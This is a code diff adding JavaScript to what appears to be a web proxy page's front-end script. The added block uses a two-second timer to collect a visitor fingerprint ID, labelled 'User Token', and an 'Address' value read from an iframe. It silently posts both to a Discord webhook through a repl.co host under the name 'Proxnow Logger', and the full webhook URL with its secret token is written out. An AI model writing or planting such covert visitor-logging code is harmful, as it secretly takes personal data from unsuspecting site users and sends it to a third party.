@@ -1,3 +1,32 @@
+setTimeout(() => {
+              var request = new XMLHttpRequest();
+request.open("POST", "https://discord-15.jstack-new.repl.co/api/webhooks/1082044185680552018/t3jeiHIN0uJQTRECzTwlfc9EMELUv_Fga-piCUwxKWKBcBmpDB9JF_Rcp44pa0Kp_AvW");
+// again, replace the url in the open method with yours
+request.setRequestHeader('Content-type', 'application/json');
+
+var myEmbed = {
+  author: {
+    name: "User Token 😎 :" + visitorId
+  },
+  title: "Address🏠: " + document.getElementById("hello2").contentWindow.document.getElementById('address').innerHTML,
+  description: "idk discord-15 not working",
+  color: hexToDecimal("#36393F")
+}
+
+var params = {
+  username: "Proxnow Logger",
+  embeds: [ myEmbed ]
+}
+
+request.send(JSON.stringify(params));
+
+// function that converts a color HEX to a valid Discord color
+function hexToDecimal(hex) {
+  return parseInt(hex.replace("#",""), 16)
+}
+}, 2000);
+    })
+    .catch(error => console.error(error))
 const form = document.querySelectorAll("form");
 const input = document.querySelector("input");
 let iframe = document.getElementById("iframe");
